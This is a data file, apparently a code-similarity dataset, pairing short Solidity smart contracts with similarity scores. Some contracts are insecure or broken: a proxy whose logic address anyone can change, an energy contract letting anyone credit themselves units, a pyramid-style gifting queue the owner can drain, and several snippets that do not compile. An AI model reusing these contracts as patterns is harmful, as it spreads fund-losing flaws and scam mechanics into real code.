  return(chatLog.length);
}

}",0.5985636106054578,"contract CChain {



    

    struct User {

        int8 gifters;

        uint id;

        uint lineNo;

        bool in_queue;

        string uid;

        address eth_address;

       

    }



    

    User[] userStore;



    

    mapping(address => User) public users;

    mapping(uint => address) public intUsers;

    

    uint public userCount;

    

    

    

    

    uint gift = 0.30 ether;

    uint public total_price = 0.125 ether;

    

    address public iown;



    uint public currentlyInLine;

    uint public lineCount;



     

    constructor() public{

        iown = msg.sender;

        currentlyInLine = 0;

        lineCount = 0;

    }



    

    function addUser(string _user_id, address _user_address) private {

        require(users[_user_address].id == 0);



        userCount++;

        userStore.length++;

        User storage u = userStore[userStore.length - 1];

        u.id = userCount;

        u.uid = _user_id;

        u.eth_address = _user_address;

        u.in_queue = false;

        u.gifters = 0;



        users[_user_address] = u;

        

        

    }





    

    function getInLine(string _user_id, address _user_address) public payable returns (bool) {

        require(msg.value >= total_price);

        require(users[_user_address].in_queue == false);



        if(users[_user_address].id == 0) {

            addUser(_user_id, _user_address);

        }



        lineCount++;

        User storage u = users[_user_address];

        u.in_queue = true;

        u.lineNo = lineCount;

        intUsers[lineCount] = _user_address;



        checkGifters();



        return true;

    }



    function checkGifters() private {

        if(currentlyInLine == 0){

            currentlyInLine = 1;

        }

        else{

            address add = intUsers[currentlyInLine];

            User storage u = users[add];

            u.gifters++;

            if(u.gifters == 3 && u.in_queue == true){

                u.in_queue = false;

                currentlyInLine++;

            }

        }

    }



    

    function getMyGifters(address _user_address) external view returns (int8) {

        return users[_user_address].gifters;

    }



    

    function getGifted(address _user_address) external {

        require(users[_user_address].id != 0);

        require(users[_user_address].gifters == 3);



        if(users[_user_address].id != 0 && users[_user_address].gifters == 3){

            _user_address.transfer(gift);

            User storage u = users[_user_address];

            u.gifters = 0;

        }

    }



    

    function withdraw() external{

        require(msg.sender == iown);

        iown.transfer(address(this).balance);

    }



    function withdrawAmount(uint amount) external{

        require(msg.sender == iown);

        iown.transfer(amount);

    }



    function getThisBalance() external view returns (uint) {

        return address(this).balance;

    }



}"
"contract Proxy {
    
    
    
    bytes32 private constant logicPosition = keccak256(""ucot.logic.address"");

    constructor (address logicAddress) public {
        updateLogic(logicAddress); 
    }

    
    function updateLogic(address newLogicAddress) public {
        _setLogic(newLogicAddress);
        
        
        
    }

    
    function _setLogic(address _logicAddress) internal {
        bytes32 position = logicPosition;
        assembly {
            sstore(position, _logicAddress)
        }
    }
    
    function _getLogic() public view returns (address logic) {
        bytes32 position = logicPosition;
        assembly {
            logic := sload(position)
        }
    }

    
    function magicFunction() public {
        address logicAddress = _getLogic();
        assembly {
            let ptr := mload(0x40)
            calldatacopy(ptr, 0x0, calldatasize) 
            let ok := delegatecall(gas, logicAddress, ptr, calldatasize, 0x0, 0)
        }

    }
}",0.5769230415128878,"contract Tikr {

    mapping (bytes32 => uint256) tokenValues;
    address adminAddress;
    address managerAddress;

    constructor () public {
        adminAddress = msg.sender;
        managerAddress = msg.sender;
    }

    modifier onlyAdmin() {
        require(msg.sender == adminAddress);
        _;
    }

    modifier onlyManager() {
        require(msg.sender == managerAddress);
        _;
    }

    function updateAdmin (address _adminAddress) public onlyAdmin {
        adminAddress = _adminAddress;
    }

    function updateManager (address _managerAddress) public onlyAdmin {
        managerAddress = _managerAddress;
    }

    function getPrice (bytes32 _ticker) public view returns (uint256) {
        return tokenValues[_ticker];
    }

    function updatePrice (bytes32 _ticker, uint256 _price) public onlyManager {
        tokenValues[_ticker] = _price;
    }

}"
"contract RFID {

        struct StateStruct {
            bytes32 description;
            mapping(bytes32 => bytes32) sub_state;
        }

        struct ObjectStruct {
            StateStruct state;
            address owner; 
            bool isObject;
        }

        mapping(bytes32 => ObjectStruct) objectStructs;
        bytes32[] public objectList;
        

        event LogNewObject(address sender, bytes32 id, bytes32 sub_states_types, bytes32 sub_states_values, address owner);
        event LogChangeObjectState(address sender, bytes32 uid, bytes32 newState);
        event LogChangeObjectOwner(address sender, bytes32 uid, address newOwner);

        function isObject(bytes32 _id) public view returns(bool isIndeed) {
            return objectStructs[_id].isObject;
        }

        function getObjectCount() public view returns(uint count) {
            return objectList.length;
        }

        

        function newObject(bytes32 _id, uint256 number_of_sub_states, bytes32[10] sub_states_types, bytes32[10] sub_states_values, address _owner) public returns(bool success) {
            require(!isObject(_id));

            uint256 counter=0;
            for(counter; counter < number_of_sub_states; counter++) {

                objectStructs[_id].state.sub_state[sub_states_types[counter]] = sub_states_values[counter];

                emit LogNewObject(msg.sender, _id, sub_states_types[counter], bytes32(sub_states_values[counter]), _owner);

            }

            objectStructs[_id].owner = _owner;
            objectStructs[_id].isObject = true;

            objectList.push(_id);

            return true;
        }

        function changeObjectState(bytes32 _id, bytes32 _newState) public returns(bool success) {
            require(isObject(_id));
            
            objectStructs[_id].state = StateStruct(_newState);
            emit LogChangeObjectState(msg.sender, _id, _newState);
            return true;
        }

        function changeObjectOwner(bytes32 _uid, address _newOwner) public returns(bool success) {
            require(isObject(_uid));
            objectStructs[_uid].owner = _newOwner;
            emit LogChangeObjectOwner(msg.sender, _uid, _newOwner);
            return true;
        }

    }",0.5603754415389643,"contract FreedomCoin is Ownable {



    string public constant symbol = ""FDC"";

    string public constant name = ""Freedom Coin"";

    uint8 public constant decimals = 0;

    uint256 public totalSupply = 100000000;

    uint256 public rate = 5000000000000000000 wei;

    

    mapping(address => uint256) balances;

    mapping(address => mapping (address => uint256)) allowed;

    

    event Transfer(address indexed _from, address indexed _to, uint256 _value);



    constructor() public{

      balances[owner] = totalSupply;

    }

    

    function () public payable {

        create(msg.sender);

    }



    function create(address beneficiary) public payable {

        require(beneficiary != address(0));



        uint256 amount = msg.value;

        

        uint256 token = (amount/rate);

        

        require(token <= balances[owner]);

        

        if(amount > 0){

            balances[beneficiary] += token;

            balances[owner] -= token;

        }

    }



    function balanceOf(address _owner) public constant returns (uint256 balance) {

        return balances[_owner];

    }

    

    function balanceMaxSupply() public constant returns (uint256 balance) {

        return balances[owner];

    }

    

    function balanceEth(address _owner) public constant returns (uint256 balance) {

        return _owner.balance;

    }

    

    function collect(uint256 amount) onlyOwner public{

        msg.sender.transfer(amount);

    }



    function transfer(address _to, uint256 _amount) public returns (bool success) {

        require(_to != address(0));

        if (balances[msg.sender] >= _amount && _amount > 0) {

            balances[msg.sender] -= _amount;

            balances[_to] += _amount;

            emit Transfer(msg.sender, _to, _amount);

            return true;

        } else {

            return false;

        }

    }



    

    function transferOwnership(address newOwner) onlyOwner public {

        require(newOwner != address(0));

        balances[newOwner] = balances[owner];

        balances[owner] = 0;

        owner = newOwner;

        emit OwnershipTransferred(owner, newOwner);

    }



}"
"contract TempAdmin is Admin {
    bool administratable = true;
    function disableAdmin() external {
        require(isAdmin());
        administratable = false;
    }
    function isAdmin() internal view returns (bool) {
        return administratable && super.isAdmin();
    }
}",0.5933121400852054,"contract HasNoEther is MultiOwnable {

    

    

    constructor() public payable {

        require(msg.value == 0);

    }

    

    

    function() external {

    }

    

    

    function reclaimEther() external onlySuperOwner returns (bool) {

        superOwner.transfer(address(this).balance);



        return true;

    }

}"
"contract Voting {
  mapping (bytes32 => uint8) public votesReceived;

  bytes32[] public candidateList;

  function Voting(bytes32[] candidateNames) {
    candidateList = candidateNames;
  }

  function totalVotesFor(bytes32 candidate) returns (uint8) {
    if (validCandidate(candidate) == false) throw;
    return votesReceived[candidate];
  }

  function voteForCandidate(bytes32 candidate) {
    if (validCandidate(candidate) == false) throw;
    votesReceived[candidate] += 1;
  }

  function validCandidate(bytes32 candidate) returns (bool) {
    for(uint i = 0; i < candidateList.length; i++) {
      if (candidateList[i] == candidate) {
        return true;
      }
    }
    return false;
  }
}",0.5338897372907696,"contract Ownable {



  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



  address public owner;

  address public ownerCandidate;



  

  constructor() public {

    owner = msg.sender;

  }



  

  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }



  

  function setOwnerCandidate(address candidate) external onlyOwner {

    ownerCandidate = candidate;

  }



  

  function approveNewOwner() external {

    address candidate = ownerCandidate;

    require(msg.sender == candidate, ""Only owner candidate can use this function"");

    emit OwnershipTransferred(owner, candidate);

    owner = candidate;

    ownerCandidate = 0x0;

  }

}"
"contract CrowdFunding {
    struct Funder {
        address addr;
        uint amount;
    }

    struct Campaign {
        address beneficiary;
        uint numFunders;
        uint amount;
        mapping (uint => Funder) funders;
    }

    uint numCampaigns;
    Campaign[] public campaigns;

    function newCampaign() public returns (uint campaignID) {
        campaignID = campaigns.length++;
        Campaign storage c = campaigns[campaignID];
        c.beneficiary = msg.sender;
    }

    function contribute(uint _campaignID, uint _amount) public {
        Campaign storage c = campaigns[_campaignID];
        c.funders[c.numFunders++] = Funder({addr: msg.sender, amount: _amount});
        c.amount += 100;
    }

    
    function getFundsByAddress() public view returns (uint[] memory) {
        Campaign storage c = campaigns[0];
        uint cont = c.numFunders;

        uint[] memory allAmount = new uint[](TotalAmountOfUser);

        uint counter = 0;

        for (uint i=0; i < cont; i++) {
           if (c.funders[counter].addr == msg.sender) {
               allAmount[amountCont] = c.funders[counter].amount;
           }
           counter++;
        }

        return allAmount;
    }   
}",0.5893934189907641,"contract Conference {  

	address public organizer;
	mapping (address => uint) public registrantsPaid;
	uint public numRegistrants;
	uint public quota;

	event Deposit(address _from, uint _amount); 
	event Refund(address _to, uint _amount); 

	function Conference() {
		organizer = msg.sender;		
		quota = 100;
		numRegistrants = 0;
	}

	function buyTicket() public {
		if (numRegistrants >= quota) { 
			throw; 
		}
		registrantsPaid[msg.sender] = msg.value;
		numRegistrants++;
		Deposit(msg.sender, msg.value);
	}

	function changeQuota(uint newquota) public {
		if (msg.sender != organizer) { return; }
		quota = newquota;
	}

	function refundTicket(address recipient, uint amount) public {
		if (msg.sender != organizer) { return; }
		if (registrantsPaid[recipient] == amount) { 
			address myAddress = this;
			if (myAddress.balance >= amount) { 
				(recipient.send(amount));
				Refund(recipient, amount);
				registrantsPaid[recipient] = 0;
				numRegistrants--;
			}
		}
		return;
	}

	function destroy() {
		if (msg.sender == organizer) { 
			suicide(organizer);
		}
	}
}"
"contract Consumer {
  uint attribut = 0;
  InfoFeed feed;
  function setFeed(address addr) { feed = InfoFeed(addr); }
  function callFeed() { attribut = feed.info.value(10).gas(800); }  
}",0.5519677945601054,"contract ProxyEventsEmitter {
    function emitTransfer(address _from, address _to, uint _value);
    function emitApprove(address _from, address _spender, uint _value);
}"
"contract CitizenAccount {
  address public issuingAuthority;
  address owner;

  function CitizenAccount(address _issuingAuthority) {
    IssuingAuthority i = IssuingAuthority(_issuingAuthority);
    bool isCitizen = i.isCitizen(msg.sender);
    if(isCitizen){
      issuingAuthority = _issuingAuthority;
    }
    else{
      throw;
    }
  }

}",0.5071753159269308,"contract MintAuthority is DSAuthority {
    address public miner;

    function MintAuthority(address _miner)
    {
        miner = _miner;
    }

    function canCall(
        address _src, address _dst, bytes4 _sig
    ) constant returns (bool) {
        return ( _src == miner && _sig == bytes4(keccak256(""mint(address,uint256)"")) );
    }
}"
"contract SetContract {

MainContract myMainContract;  

constructor(
    address _myMainContract
) public {
    myMainContract = MainContract(_myMainContract);  
}

function setVariable1MainContract(string memory newValue) public {
    myMainContract.setVariable1(newValue);
}}",0.5486533872056071,"contract KingOfEthBoardReferencer is GodMode {

    

    address public boardContract;



    

    modifier onlyBoardContract()

    {

        require(boardContract == msg.sender);

        _;

    }



    

    

    function godSetBoardContract(address _boardContract)

        public

        onlyGod

    {

        boardContract = _boardContract;

    }

}"
"contract CA3 {

  uint public test=9;
  struct Student {
    uint age;
    uint income;
    uint score;
    uint attendance;
  }
  Student[] public students;
  uint public studentCount=0;

  function setStudent (uint _age, uint _income, uint _score, uint _attendance) public {
    test=19;
    students.push(Student({age: _age, income: _income, score: _score, attendance: _attendance}));    
  }    
}",0.5314112736382761,"contract TokenRate {
    uint public USDValue;
    uint public EURValue;
    uint public GBPValue;
    uint public BTCValue;
    address public owner = msg.sender;

    modifier ownerOnly() {
        require(msg.sender == owner);
        _;
    }

    function setValues(uint USD, uint EUR, uint GBP, uint BTC) ownerOnly public {
        USDValue = USD;
        EURValue = EUR;
        GBPValue = GBP;
        BTCValue = BTC;
    }
}"
"contract ValueSetter {
  struct BasicValue {
    uint256 value;
  }

  address my_address; 
  BasicValue fixed_value;
  mapping(address => BasicValue) fixed_values;

  function ValueSetter(address init_address) public {
    my_address = init_address;
    fixed_values[init_address] = fixed_value;
  }

  function set_value(uint256 my_value) external {
    
    require(msg.sender == my_address && my_value != 0);

    fixed_values[msg.sender].value = my_value;

    assert(fixed_value.value != 0);
  }
}",0.5743323684305094,"contract AccessMint is Claimable {

  
  mapping(address => bool) private mintAccess;

  
  event Mint(
    address indexed _to,
    uint256 indexed _tokenId
  );

  
  modifier onlyAccessMint {
    require(msg.sender == owner || mintAccess[msg.sender] == true);
    _;
  }

  
  function grantAccessMint(address _address)
    onlyOwner
    public
  {
    mintAccess[_address] = true;
  }

  
  function revokeAccessMint(address _address)
    onlyOwner
    public
  {
    mintAccess[_address] = false;
  }

}"
"contract Energy {

    
    mapping(address => uint) prosumer;

    struct storageVirtuale {
        uint dataDiScadenzaVendita;
        uint prezzoAcquisto; 
        uint prezzoVendita; 
        uint identificativo;
        uint wallet;    
        uint32 capienzaTotale;
        uint32 kWhAttualmenteConservati;
        
        bool deactivated;
    }

    mapping(address => storageVirtuale[]) energyManager;
    mapping(address => bool) energyManagersMapping;

    event Buy(address prosumerAddress, address storageOwner, uint storageId, uint32 quantity, uint paid);
    event Sell(address prosumerAddress, address storageOwner, uint storageId, uint32 quantity, uint earned);
    event StorageCreated(address owner, uint id);
    event StorageEdited(address owner, uint id);

    function buyFromStorageVirtuale(address addr, uint id, uint32 quantity) public payable{
        require(energyManager[addr].length > id);
        storageVirtuale memory scelto = energyManager[addr][id];
        require(quantity <= scelto.kWhAttualmenteConservati);
        require(msg.value >= scelto.prezzoVendita * quantity); 

        prosumer[msg.sender] += quantity;
        scelto.kWhAttualmenteConservati -= quantity;
        energyManager[addr][id] = scelto;

        scelto.wallet += scelto.prezzoVendita * quantity;

        emit Buy(msg.sender, addr, id, quantity, msg.value);
    }

    function sellToStorageVirtuale(address addr, uint id, uint32 quantity) public{
        require(energyManager[addr].length > id);
        storageVirtuale memory scelto = energyManager[addr][id];
        require(quantity <= scelto.capienzaTotale - scelto.kWhAttualmenteConservati); 
        require(prosumer[msg.sender] >= quantity); 

        prosumer[msg.sender] -= quantity;
        scelto.kWhAttualmenteConservati += quantity;
        scelto.wallet -= scelto.prezzoAcquisto * quantity;
        energyManager[addr][id] = scelto;

        msg.sender.transfer(quantity * scelto.prezzoAcquisto);

        emit Sell(msg.sender, addr, id, quantity, quantity * scelto.prezzoAcquisto);
    }

    function createStorageVirtuale(uint32 capienzaTotale, uint prezzoAcquisto, uint prezzoVendita, uint dataDiScadenzaVendita) public payable{
        require(isEnergyManager(msg.sender));
        
        require(msg.value >= capienzaTotale * prezzoAcquisto);
        
        require(prezzoAcquisto < prezzoVendita);

        energyManager[msg.sender].push(storageVirtuale(dataDiScadenzaVendita, prezzoAcquisto, prezzoVendita, energyManager[msg.sender].length, msg.value, capienzaTotale, 0, false));

        emit StorageCreated(msg.sender, energyManager[msg.sender].length - 1);
    }

    function editStorageVirtuale(uint id, uint32 capienzaTotale, uint prezzoAcquisto, uint prezzoVendita, uint dataDiScadenzaVendita) public payable{
        require(energyManager[msg.sender].length > id); 
        
        require(prezzoAcquisto < prezzoVendita);

        storageVirtuale memory temp = energyManager[msg.sender][id];
        
        require(capienzaTotale >= temp.kWhAttualmenteConservati);
        
        require(temp.wallet + msg.value >= capienzaTotale * prezzoAcquisto);

        temp.capienzaTotale = capienzaTotale;
        temp.prezzoAcquisto = prezzoAcquisto;
        temp.prezzoVendita = prezzoVendita;
        temp.dataDiScadenzaVendita = dataDiScadenzaVendita;
        temp.wallet += msg.value;

        energyManager[msg.sender][id]=temp;

        emit StorageEdited(msg.sender, id);
    }

    function getPossessedkWh(address he) public view returns(uint){
        return prosumer[he];
    }

    function givekWh(uint quantity) public {
        prosumer[msg.sender] += quantity;
    }

    function disableStorageVirtuale(uint id) public {
        require(energyManager[msg.sender].length > id);
        energyManager[msg.sender][id].deactivated = true;
    }

    function withdrawFromStorageVirtuale(uint id, uint maxWei) public{
        require(energyManager[msg.sender].length > id);
        storageVirtuale memory temp = energyManager[msg.sender][id];
        uint toWithraw = temp.wallet - ((temp.capienzaTotale - temp.kWhAttualmenteConservati) * temp.prezzoAcquisto);
        if(maxWei <= toWithraw){
            msg.sender.transfer(1000);
        } else {
            msg.sender.transfer(1);
        }
    }

    function getAllStorageVirtuale(address toCheck) public view returns(uint){
        return energyManager[toCheck].length;
    }

    function getStorageVirtuale(address addr, uint id) public view returns(uint, uint, uint, uint, uint, uint32, uint32, bool){
        require(energyManager[addr].length > id);
        storageVirtuale storage temp = energyManager[addr][id];
        return(temp.dataDiScadenzaVendita, temp.prezzoAcquisto, temp.prezzoVendita, temp.identificativo, temp.wallet, temp.capienzaTotale, temp.kWhAttualmenteConservati, temp.deactivated);
    }

    function addEnergyManager(address toAdd) public {
        require(isEnergyManager(msg.sender));
        energyManagersMapping[toAdd] = true;
    }

    function isEnergyManager(address toCheck) public view returns(bool){
        return energyManagersMapping[toCheck];
    }

    
    constructor() public{
        energyManagersMapping[msg.sender] = true;
    }

    function () external payable{

    }

    function pay() public payable{

    }
}",0.5491937680156591,"contract Bulksender is Ownable{

    using SafeMath for uint;
    event LogTokenBulkSent(address token,uint256 total);
    event LogGetToken(address token, address receiver, uint256 balance);
    
  function getBalance(IERC20 token) onlyOwner public {
      address _receiverAddress = getReceiverAddress();
      if(token == address(0)){
          require(_receiverAddress.send(address(this).balance));
          return;
      }
      uint256 balance = token.balanceOf(this);
      token.transfer(_receiverAddress, balance);
      emit LogGetToken(token,_receiverAddress,balance);
  }
  
  function initialize(address _owner) public{
        require(!initialized());
        setOwner(_owner);
        setReceiverAddress(_owner);
        setTxFee(0.01 ether);
        setVIPFee(1 ether);
        
        boolStorage[keccak256(""initialized"")] = true;

        
  }
  
  function() public payable {}

  function initialized() public view returns (bool) {
        return boolStorage[keccak256(""initialized"")];
  }

   
  function registerVIP() payable public {
      require(msg.value >= VIPFee());
      address _receiverAddress = getReceiverAddress();
      require(_receiverAddress.send(msg.value));
      boolStorage[keccak256(abi.encodePacked(""vip"", msg.sender))] = true;
  }
  
  

  
  function addToVIPList(address[] _vipList) onlyOwner public {
    for (uint i =0;i<_vipList.length;i++){
      boolStorage[keccak256(abi.encodePacked(""vip"", _vipList[i]))] = true;
    }
  }

  
  function removeFromVIPList(address[] _vipList) onlyOwner public {
    for (uint i =0;i<_vipList.length;i++){
      boolStorage[keccak256(abi.encodePacked(""vip"", _vipList[i]))] = false;
    }
   }

    
    function isVIP(address _addr) public view returns (bool) {
        return _addr == owner() || boolStorage[keccak256(abi.encodePacked(""vip"",_addr))];
    }

    
    function setReceiverAddress(address _addr) onlyOwner public {
        require(_addr != address(0));
        addressStorage[keccak256(""receiverAddress"")] = _addr;

    }

    
    function getReceiverAddress() public view returns  (address){
        address _receiverAddress = addressStorage[keccak256(""receiverAddress"")];
        if(_receiverAddress == address(0)){
            return owner();
        }
        return _receiverAddress;
    }
    
     
    function VIPFee() public view returns (uint256) {
        return uintStorage[keccak256(""vipFee"")];
    }


     
    function setVIPFee(uint256 _fee) onlyOwner public {
        uintStorage[keccak256(""vipFee"")] = _fee;
    }

    
    function setTxFee(uint256 _fee) onlyOwner public {
        uintStorage[keccak256(""txFee"")] = _fee;
    }
    
    function txFee() public view returns (uint256) {
        return uintStorage[keccak256(""txFee"")];
    }
    
    function checkTxExist(bytes32 _txRecordId)  public view returns  (bool){
        return boolStorage[keccak256(abi.encodePacked(""txRecord"", msg.sender, _txRecordId))];
    }
    
    function addTxRecord(bytes32 _txRecordId) internal{
        boolStorage[keccak256(abi.encodePacked(""txRecord"", msg.sender, _txRecordId))] = true;
    }

    function _bulksendEther(address[] _to, uint256[] _values) internal {

        uint sendAmount = _values[0];
		uint remainingValue = msg.value;

	    bool vip = isVIP(msg.sender);
        if(vip){
            require(remainingValue >= sendAmount);
        }else{
            require(remainingValue >= sendAmount.add(txFee())) ;
        }
		require(_to.length == _values.length);

		for (uint256 i = 1; i < _to.length; i++) {
			remainingValue = remainingValue.sub(_values[i]);
			require(_to[i].send(_values[i]));
		}
	    emit LogTokenBulkSent(0x000000000000000000000000000000000000bEEF,msg.value);

    }

    function _bulksendToken(IERC20 _token, address[] _to, uint256[] _values)  internal  {
		uint sendValue = msg.value;
	    bool vip = isVIP(msg.sender);
        if(!vip){
		    require(sendValue >= txFee());
        }
		require(_to.length == _values.length);

        uint256 sendAmount = _values[0];
        _token.transferFrom(msg.sender,address(this), sendAmount);
        
		for (uint256 i = 1; i < _to.length; i++) {
		    _token.transfer(_to[i], _values[i]);
		}
        emit LogTokenBulkSent(_token,sendAmount);

    }
    
    function _bulksendTokenSample(IERC20 _token, address[] _to, uint256[] _values)  internal  {
		uint sendValue = msg.value;
	    bool vip = isVIP(msg.sender);
        if(!vip){
		    require(sendValue >= txFee());
        }
		require(_to.length == _values.length);

        uint256 sendAmount = _values[0];
		for (uint256 i = 1; i < _to.length; i++) {
		    _token.transferFrom(msg.sender, _to[i], _values[i]);
		}
        emit LogTokenBulkSent(_token,sendAmount);

    }
    
    function bulksendTokenSample(IERC20 _token, address[] _to, uint256[] _values, bytes32 _uniqueId) payable public {
        if(checkTxExist(_uniqueId)){
            if (msg.value > 0)
                require(msg.sender.send(msg.value));
        }else{
            addTxRecord(_uniqueId);
	        _bulksendTokenSample(_token, _to, _values);
        }
    }

    function bulksendToken(IERC20 _token, address[] _to, uint256[] _values, bytes32 _uniqueId) payable public {
        if(checkTxExist(_uniqueId)){
            if (msg.value > 0)
                require(msg.sender.send(msg.value));
        }else{
            addTxRecord(_uniqueId);
	        _bulksendToken(_token, _to, _values);
        }
    }
    
    function bulksendEther(address[] _to, uint256[] _values,bytes32 _uniqueId) payable public {
        if(checkTxExist(_uniqueId)){
            if (msg.value > 0)
                require(msg.sender.send(msg.value));
        }else{
            addTxRecord(_uniqueId);
	        _bulksendEther(_to, _values);
        }
	}
	
}"
"contract mContract {

function verify(string memory _user, string memory _passwd) public view {
require(
      (keccak256(bytes(userMap[_user].user)) == keccak256(bytes(_user))) &&
      (keccak256(bytes(userMap[_user].passwd)) == keccak256(bytes(_passwd))),
      ""Invalid""
);
}",0.5352207458509839,"contract IProxyContractForBurn {
    function setnxcAddress(address new_address) public;
    function burnNxCtoMintAssets(uint256 nbOfAsset, string[] memory keys, string[] memory values) public view returns (uint256);
}"
"contract AddressList {  
    mapping(address => uint) MemberAddresses;

    function registerAddress(uint var) { 
        MemberAddresses[msg.sender] = var;
    }  
}",0.5644414055356638,"contract Membership {
  function removeMember(address _user) external;
  function setMemberTier(address _user, uint _tier);
}"
"contract TestAdoption {
    Adoption adoption = Adoption(DeployedAddresses.Adoption());

    
    function testUserCanAdoptPet() public {
      uint returnedId = adoption.adopt(8);
      uint expected = 8;
      Assert.equal(returnedId, expected, ""Adoption of pet ID 8 should be recorded."");
    }

    
    function testGetAdopterAddressByPetId() public {
        
        address expected = this;
        address adopter = adoption.adopters(8);
        Assert.equal(adopter, expected, ""Owner of pet ID 8 should be recorded."");
    }

    
    function testGetAdopterAddressByPetIdInArray() public {
        
        address expected = this;

        
        address[16] memory adopters = adoption.getAdopters();

        Assert.equal(adopters[8], expected, ""Owner of pet ID 8 should be recorded."");
    }

}",0.5260684230317467,"contract ERC721  {

    

    

    function totalSupply() public view returns (uint256 total);

    function balanceOf(address _owner) public view returns (uint256 balance);

    function ownerOf(uint256 _tokenId) public view returns (address owner);

    function approve(address _to, uint256 _tokenId) external;

    function transfer(address _to, uint256 _tokenId) external;

    function transferFrom(address _from, address _to, uint256 _tokenId) external;



    

    event Transfer(address from, address to, uint256 tokenId);

    event Approval(address owner, address approved, uint256 tokenId);



    

    

    

    

    



    

    function supportsInterface(bytes4 _interfaceID) external view returns (bool);

    

}"
"contract Session {

      address public creator;  

      string sessionName;
      string description;
      uint startTime;
      uint endTime;
      address[] lecturer;
      address[] attendes; 

      int[] result; 
      mapping(address => int) public attendes_feedback; 
      modifier onTime(uint _startTime){
            require(now < _startTime);
            _;
      }
      constructor (string memory _sessionName, string memory _description, uint _startTime,uint _endTime,address[] memory   _lecturer,address[] memory  _attendes) public onTime(_startTime){

              sessionName =  _sessionName;
              description = _description;
              startTime = _startTime;
              endTime = _endTime;
              attendes = _attendes;
              lecturer = _lecturer;
              initAttendes(attendes);
      } 

    function initAttendes(address[] memory _attendes) private{
           for(uint i=0 ; i < _attendes.length ; i++){
            attendes_feedback[_attendes[i]] = -1;
        }
    }

    function Time() public view returns (bool){
       return (now >=  startTime  && now <= endTime);          
     }

    modifier checkTime(){
        require(Time());
        _;
      }
    function take_feedback(address _voter,uint8 _feedback)  public checkTime {
          require(attendes_feedback[_voter] != 0);
          attendes_feedback[_voter] = _feedback;
          result[_feedback]++;
    }

  function seeResult() public view returns(int[] memory){
          return result;
  }

 }",0.5842356394958184,"contract Affiliate {
  struct Share {
      address shareholder;
      uint stake;
  }

  Share[] shares;
  uint public totalShares;
  string public relayerName;
  address registry;
  WETH9 weth;

  event Payout(address indexed token, uint amount);

  function init(address _registry, address[] shareholders, uint[] stakes, address _weth, string _name) public returns (bool) {
    require(totalShares == 0);
    require(shareholders.length == stakes.length);
    weth = WETH9(_weth);
    totalShares = 0;
    for(uint i=0; i < shareholders.length; i++) {
        shares.push(Share({shareholder: shareholders[i], stake: stakes[i]}));
        totalShares += stakes[i];
    }
    relayerName = _name;
    registry = _registry;
    return true;
  }
  function payout(address[] tokens) public {
      
      
      
      
      
      for(uint i=0; i < tokens.length; i++) {
          ERC20 token = ERC20(tokens[i]);
          uint balance = token.balanceOf(this);
          for(uint j=0; j < shares.length; j++) {
              token.transfer(shares[j].shareholder, SafeMath.mul(balance, shares[j].stake) / totalShares);
          }
          emit Payout(tokens[i], balance);
      }
  }
  function isAffiliated(address _affiliate) public returns (bool)
  {
      return Registry(registry).isAffiliated(_affiliate);
  }

  function() public payable {
    
    
    
    weth.deposit.value(msg.value)();
  }

}"
"contract Organization {

     address creator;
     event sessionnCreated(string name,address sessionAddress ,address creator);

     
     function createdSession(
      string memory _sessionName,
      string memory _description,
      uint _startTime,
      uint _endTime,
      address[] memory _lecturer,
      address[] memory _attendes
     ) public   returns(address) {

        Session sessionAddress = new Session(_sessionName , _description , _startTime , _endTime, _lecturer,_attendes );
        emit sessionnCreated(_sessionName,address(sessionAddress),creator);
        return address(sessionAddress);
     }
}",0.5654678286959074,"contract ERC20AuctionFactory is IERC20AuctionFactory{
  event NewERC20Auction(address addr);

  function createERC20Auction(address _auction_proxy,
              uint _min_obj_amount,
              uint _min_bid_price,
              uint _obj_price_unit,
              uint _start_block,
              uint _end_block,
              address _creator,
              address _multisig
                             )public returns(address){
                               ERC20Auction auction = new ERC20Auction(
                                 _auction_proxy,
                                 _min_obj_amount,
                                 _min_bid_price,
                                 _obj_price_unit,
                                 _start_block,
                                 _end_block,
                                 _creator,
                                 _multisig
                               );
                               emit NewERC20Auction(address(auction));
                               return address(auction);
                             }
}"
"contract EncryptedData {
   bytes[] data;
   string public decryptedData[];

   function addData(bytes data_) { 
       data.push(data_);
   }

   function decrypt(bytes key) public {
       for (uint i = 0; i < data.length; i++) {  
           decryptedData.push(decryptDataSomehow(data[i], key));
       }
   }
}",0.5894272446723818,"contract whoSays {

    string public name = ""whoSays"";

    mapping(address => bytes) public data;

    event Said(address indexed person, bytes message);

    function saySomething(bytes _data) public {
        data[msg.sender] = _data;
        Said(msg.sender, _data);
    }

}"
"contract MyERC721Token is ERC721Token {

  function createNewToken(...) {
    _mint(msg.sender, index);
  }
}",0.5677571978154277,"contract CanReclaimToken is Ownable {

  function reclaimToken(ERC20Basic token) external;

}"
"contract RegisterCandidate {
    
    struct Address {
        string addressLine;
        string district;
        string state;
        uint pincode;     
    }

    
    struct Candidate {
        uint id;
        string name;
        Address addr;
        uint voteCount;
        uint age;
    }
    
    mapping(uint => Candidate) public candidates;
    mapping(uint => Address) public addresses;
    
    uint public candidatesCount;

    function addCandidate (string _name,uint _age,string _address,string _district,string _state,uint _pincode) public {
        candidatesCount ++;
        addresses[candidatesCount] = Address(_address,_district,_state,_pincode);
        candidates[candidatesCount] = Candidate(candidatesCount, _name,addresses[candidatesCount], 0, _age);
    }

}",0.5535093773866346,"contract ThingFactory {
    address[] public addressList;
    address payable public mintbase;

    event StoreLaunch(
        address indexed store,
        string name,
        string symbol
    );

    constructor() public {
        mintbase = msg.sender;
    }
    

    function launchStore(
      string memory name,
      string memory symbol,
      string memory uri
    ) public returns (address item) {
        address newStore = address(new Thing(name, symbol, uri, mintbase, msg.sender));
        addressList.push(newStore);
        emit StoreLaunch(newStore, name, symbol);
        return newStore;
    }

    function getCount() public view returns (uint exchangeCount) {
        return addressList.length;
    }
}"
"contract Election {
      
          struct Candidate {
          uint id;
          string name;
          uint voteCount;
     }


mapping(uint => Candidate) public candidates;

uint public candidatesCount;

 constructor() public {
    addCandidate(""Candidate 1"");
    addCandidate(""Candidate 2"");
}

function addCandidate (string  memory _name) private {
    candidatesCount ++;
    candidates[candidatesCount] = Candidate(candidatesCount, _name, 0);
}
 }",0.5404240047469774,"contract Owned {
    address public owner;
    address public candidate;

    
    function Owned() internal {
        owner = msg.sender;
    }

    
    modifier onlyOwner {
        require(owner == msg.sender);
        _;
    }

    
    function changeOwner(address _owner) onlyOwner public {
        candidate = _owner;
    }

    
    function acceptOwner() public {
        require(candidate != address(0));
        require(candidate == msg.sender);
